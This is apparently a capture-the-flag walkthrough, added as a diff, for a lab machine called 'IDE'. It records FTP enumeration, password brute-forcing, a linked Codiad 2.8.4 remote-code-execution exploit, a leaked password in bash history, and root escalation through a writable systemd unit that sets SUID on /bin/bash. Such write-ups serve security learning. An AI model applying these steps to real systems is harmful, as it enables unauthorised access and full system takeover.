@@ -1,0 +1,74 @@
+1. Enumerate ports
+	PORT   STATE SERVICE
+	21/tcp open  ftp
+	22/tcp open  ssh
+	80/tcp open  http
+	62337/tcp open  unknown
+
+2. Check 21 port (ftp)
+	lftp ide.thm:/> cd ...
+	cd ok, cwd=/...                     
+	
+	lftp ide.thm:/...> ls
+	-rw-r--r--    1 0        0             151 Jun 18  2021 -
+	
+	lftp ide.thm:/...> cat ./-
+	Hey john,                             
+	I have reset the password as you have asked. Please use the default password to login. 
+	Also, please take care of the image file ;)
+	- drac.
+
+	Lite bruting password for john... 
+		Creds: { john:password }
+
+3. Visit ide.thm on 62337 port
+	CMS: Codiad
+	Version: 2.8.4
+	Vulnerable: True
+	Exploit: https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit
+	And I get RCE !!! :)
+
+4. Privilege escalatoin (user1)
+	www-data$ cat /home/drac/.bash_history
+	mysql -u drac -p 'Th3dRaCULa1sR3aL'
+	And login on ssh to drac... Get user flag!
+
+5. Privilege escalation (root)
+	drac$ sudo -l
+	User drac may run the following commands on ide:
+    	(ALL : ALL) /usr/sbin/service vsftpd restart
+    find / -user drac 2>&1 | grep -v "find:"
+    ...Nothing...
+    find / -group drac 2>&1 | grep -v "find:"
+    /lib/systemd/system/vsftpd.service
+    drac$ ls -la /lib/systemd/system/vsftpd.service
+    -rw-rw-r-- 1 root drac 248 Aug  4 07:24 /lib/systemd/system/vsftpd.service
+    drac$ cat /lib/systemd/system/vsftpd.service
+    <START>
+    	[Unit]
+		Description=vsftpd FTP server
+		After=network.target
+
+		[Service]
+		Type=simple
+		ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
+		ExecReload=/bin/kill -HUP $MAINPID
+		ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
+
+		[Install]
+		WantedBy=multi-user.target
+	<END>
+	Modify file
+	...
+	ExecStart=/bin/chmod +s /bin/bash
+	...
+	drac$ sudo /usr/sbin/service vsftpd restart
+	drac$ systemctl daemon-reload
+	drac$ sudo /usr/sbin/service vsftpd restart
+	drac$ ls -la /bin/bash
+	-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
+	drac$ /bin/bash -p
+	drac# id
+	uid=1000(drac) gid=1000(drac) euid=0(root) egid=0(root) groups=0(root)...
+	!!! And Im root !!! :D
+Thanks!
